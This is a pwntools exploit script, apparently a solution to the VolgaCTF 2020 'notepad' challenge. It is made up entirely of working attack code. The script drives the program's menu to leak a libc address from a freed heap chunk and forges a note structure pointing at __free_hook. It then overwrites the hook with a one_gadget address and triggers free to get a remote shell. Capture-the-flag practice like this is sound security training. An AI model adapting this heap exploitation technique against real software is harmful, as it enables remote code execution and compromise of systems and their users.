from pwn import *
import subprocess
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

gdb_script = 'c'

DEBUG = [False, True][int(sys.argv[1])]
if DEBUG:
    r = process('./notepad')
    gdb.attach(r, gdb_script)
else:
    r = remote('notepad.q.2020.volgactf.ru', 45678)

# elf = ELF('./notepad')
libc = ELF('./libc.so.6')

one_gadgets = map(int,subprocess.check_output(['one_gadget', '--raw', './libc.so.6']).split(' '))

go = lambda x: r.sendlineafter('> ', str(x))
ii = lambda x: r.sendlineafter(': ', str(x))

def add_note(name):
    go('a')
    ii(name)

def list_note():
    go('l')

def delete_note(idx):
    go('d')
    ii(idx)

def pick_note(idx):
    go('p')
    ii(idx)

def qquit():
    go('q')

def add_tab(name, size, data):
    go('a')
    ii(name)
    ii(size)
    ii(data)

def delete_tab(idx):
    go('d')
    ii(idx)

def list_tab(name, size, data):
    go('l')

def update_tab(idx, name, size, data):
    go('u')
    ii(idx)
    ii(name)
    ii(size)
    ii(data)

def view_tab(idx):
    go('v')
    ii(idx)

# log.info('heap base: 0x%x' % heap_base)
# log.info('pie base: 0x%x' % pie_base)

add_note('AAAA')
pick_note(1)

# leak libc base
add_tab('a', 0x500, 'a')
add_tab('a', 0x90, 'a')
delete_tab(1)
add_tab('a', 0x90, 'a')
view_tab(2)

libc_leak = u64(r.recv(0x10)[0x8:]) 
libc_base = libc_leak - 4112592
free_hook = libc_base + libc.symbols['__free_hook']
one_gadget = libc_base + one_gadgets[1]
log.info('libc leak: 0x%x' % libc_leak)
log.info('libc base: 0x%x' % libc_base)

qquit()
fake_note = 'a'*0x10 + p64(0x1) + 'a'*0x10 + p64(0x100) + p64(free_hook)
add_note(fake_note)
pick_note(2)

update_tab(1, '', '', p64(one_gadget))

delete_tab(1)

r.interactive()